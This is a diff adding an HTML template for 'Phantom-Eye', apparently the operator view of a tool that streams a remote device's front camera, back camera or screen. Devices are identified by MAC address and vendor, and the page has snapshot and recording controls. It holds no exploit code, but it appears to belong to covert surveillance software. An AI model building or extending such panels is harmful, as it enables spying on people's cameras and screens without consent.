@@ -1,0 +1,142 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Stream Viewer | Phantom-Eye</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.min.js"></script>
+    <style>
+        body,
+        html {
+            height: 100%;
+            overflow: hidden;
+            background: #000;
+        }
+
+        .viewer-container {
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            position: relative;
+        }
+
+        .main-stream {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        .main-stream video {
+            max-width: 100%;
+            max-height: 100%;
+            width: auto;
+            height: auto;
+            box-shadow: 0 0 50px rgba(0, 0, 0, 0.5);
+        }
+
+        .stream-controls {
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 10px;
+            background: rgba(0, 0, 0, 0.7);
+            padding: 10px 20px;
+            border-radius: 30px;
+            border: 1px solid var(--border);
+            backdrop-filter: blur(10px);
+            z-index: 100;
+        }
+
+        .btn-control {
+            background: #2c2c34;
+            color: white;
+            border: none;
+            padding: 10px 18px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            font-weight: 600;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn-control:hover {
+            background: var(--accent);
+        }
+
+        .btn-active {
+            background: var(--accent);
+        }
+
+        .stream-info {
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            color: white;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.8);
+            z-index: 100;
+        }
+
+        .live-tag {
+            display: inline-block;
+            width: 8px;
+            height: 8px;
+            background: var(--danger);
+            border-radius: 50%;
+            margin-right: 8px;
+            animation: blink 1s infinite;
+        }
+
+        .corner-logo {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-weight: 800;
+            font-size: 1.2rem;
+            color: rgba(255, 255, 255, 0.3);
+            pointer-events: none;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="viewer-container">
+        <div class="stream-info">
+            <div style="display: flex; align-items: center; gap: 15px;">
+                <h2><span class="live-tag"></span><span id="mac-display">{{ device.mac }}</span></h2>
+                <div id="rec-status" class="recording-indicator" style="display: none;">
+                    <div class="recording-dot"></div> REC
+                </div>
+            </div>
+            <div id="vendor-info" style="font-size: 0.9rem; opacity: 0.7;">{{ device.vendor }}</div>
+        </div>
+
+        <div class="corner-logo">PHANTOM-EYE</div>
+        <div class="viewer-overlay"></div>
+
+        <div class="main-stream" id="main-stream">
+            <div id="placeholder" class="status-waiting" style="border:none;">Connecting to stream...</div>
+            <video id="viewer-video" autoplay playsinline style="display:none;"></video>
+        </div>
+
+        <div class="stream-controls">
+            <button class="btn-control" onclick="switchCamera('front')" id="btn-front">📷 Front</button>
+            <button class="btn-control" onclick="switchCamera('back')" id="btn-back">📷 Back</button>
+            <button class="btn-control" onclick="switchCamera('screen')" id="btn-screen">🖥️ Screen</button>
+            <button class="btn-control" onclick="takeSnapshot()" style="margin-left: 20px;">📸 SNAP</button>
+            <button class="btn-control" onclick="location.href='/device/{{ device.mac.replace(':', '-') }}';"
+                style="background:transparent; border: 1px solid rgba(255,255,255,0.2);">Exit</button>
+        </div>
+    </div>
+    <script src="{{ url_for('static', filename='js/viewer.js') }}"></script>
+</body>
+
+</html>
